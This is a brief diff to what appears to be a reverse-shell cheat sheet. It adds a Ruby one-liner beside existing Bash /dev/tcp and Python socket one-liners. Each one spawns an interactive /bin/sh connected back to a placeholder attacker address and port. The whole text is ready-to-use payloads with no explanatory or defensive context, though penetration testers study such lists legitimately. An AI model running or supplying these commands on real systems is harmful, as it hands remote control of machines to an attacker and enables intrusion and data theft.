@@ -15,3 +15,6 @@ bash -i >& /dev/tcp/IPAdress/PortNumber 0>&1
 
 #Python
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IPAdress",PortNumber));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+#Ruby
+ruby -rsocket -e'f=TCPSocket.open("IPAdress",PortNumber).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
